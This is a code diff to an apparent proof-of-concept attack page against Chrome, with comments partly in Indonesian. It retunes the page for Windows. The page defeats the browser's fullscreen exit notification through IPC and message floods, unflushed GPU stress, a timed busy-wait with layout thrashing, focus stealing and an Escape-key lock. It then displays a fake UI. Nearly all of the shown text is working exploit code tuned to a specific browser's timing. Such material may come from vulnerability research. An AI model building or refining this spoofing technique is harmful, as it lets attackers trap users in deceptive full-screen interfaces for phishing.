@@ -208,35 +208,8 @@ function startGPUStress(iterations) {
     gl.bindTexture(gl.TEXTURE_2D, tex);
     gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
   }
-  // Flush GPU pipeline
-  gl.flush();
-  gl.finish();
-  log('GPU stress: ' + iterations + ' textures + flush/finish', 'ok');
-}
-
-// ────────────────────────────────────────────────────────────────
-// COMPOSITOR STRESS — khusus untuk Linux (X11/Wayland path)
-// ────────────────────────────────────────────────────────────────
-function startCompositorStress() {
-  // Buat banyak layer baru — paksa compositor membuat layer tree baru
-  // sebelum fullscreen, sehingga notification paint harus antri
-  const frag = document.createDocumentFragment();
-  for (let i = 0; i < 80; i++) {
-    const d = document.createElement('div');
-    d.style.cssText = `
-      position: fixed;
-      width: 1px; height: 1px;
-      transform: translateZ(${i}px);
-      will-change: transform;
-      opacity: 0;
-      top: ${i}px; left: ${i}px;
-    `;
-    frag.appendChild(d);
-  }
-  document.body.appendChild(frag);
-  // Force compositing
-  void document.body.offsetHeight;
-  log('Compositor stress: 80 GPU layers created', 'ok');
+  // JANGAN flush/finish — biarkan GPU command queue menumpuk
+  log('GPU stress: ' + iterations + ' textures (unflushed)', 'ok');
 }
 
 // ────────────────────────────────────────────────────────────────
@@ -284,9 +257,8 @@ btnLaunch.onclick = async function() {
   }
   log('IPC flood done', 'ok');
 
-  // ── Phase 2: GPU + compositor stress ──────────────────────────
-  startGPUStress(600);
-  startCompositorStress();
+  // ── Phase 2: GPU stress (unflushed queue) ─────────────────────
+  startGPUStress(300);
 
   // ── Phase 2b: Keyboard lock BEFORE fullscreen ──────────────────
   // Locks Escape key so notification is non-functional even if shown.
@@ -310,41 +282,18 @@ btnLaunch.onclick = async function() {
     log('Fullscreen confirmed — starting notification suppression', 'ok');
     startTimer();
 
-    // Phase 4: Busy-wait — Linux needs longer window (1200ms vs 700ms)
-    // Chrome Linux compositor timing differs from Win/Mac.
-    log('Phase 4: Busy-wait 1200ms + layout thrash...');
+    // Phase 4: Busy-wait — Windows sweet spot 700-900ms
+    // Jangan terlalu panjang: Chrome Windows punya watchdog yang kick in > 1s
+    log('Phase 4: Busy-wait 800ms + layout thrash...');
     const t0 = performance.now();
-    while (performance.now() - t0 < 1200) {
+    while (performance.now() - t0 < 800) {
       history.replaceState(null, '', '#' + Math.random());
       void document.body.offsetHeight;
       void document.documentElement.scrollTop;
-      void document.body.getBoundingClientRect();
     }
     log('Busy-wait done: ' + Math.round(performance.now() - t0) + 'ms', 'ok');
 
-    // Phase 5: Microtask flood — blocks between paint frames
-    // Fills the microtask queue so notification paint is deferred
-    function floodMicrotasks(n) {
-      if (n <= 0 || !floodActive) return;
-      Promise.resolve().then(() => floodMicrotasks(n - 1));
-    }
-    floodMicrotasks(5000);
-    log('Phase 5: Microtask flood (5000 queued)', 'ok');
-
-    // Phase 6: RAF-based compositor pressure
-    // Keeps the compositor thread busy during notification window
-    let rafCount = 0;
-    function compositorPressure() {
-      if (!floodActive || rafCount > 120) return;
-      rafCount++;
-      // Force a style recalc + composite on every frame
-      document.documentElement.style.transform = `translateZ(${rafCount % 2}px)`;
-      void document.documentElement.offsetHeight;
-      requestAnimationFrame(compositorPressure);
-    }
-    requestAnimationFrame(compositorPressure);
-
-    // Phase 7: Focus stealing chain
+    // Phase 5: Focus stealing chain
     function stealFocus() {
       const inp = document.createElement('input');
       inp.style.cssText = 'position:fixed;top:-9999px';
@@ -355,9 +304,9 @@ btnLaunch.onclick = async function() {
     }
     stealFocus();
 
-    // Phase 8: Message flood
+    // Phase 6: Message flood
     startMessageFlood();
-    log('Phases 6-8: RAF pressure + focus steal + msg flood active', 'ok');
+    log('Phase 5+6: Focus stealing + message flood active', 'ok');
 
     showFakeUI();
   }).catch(err => {
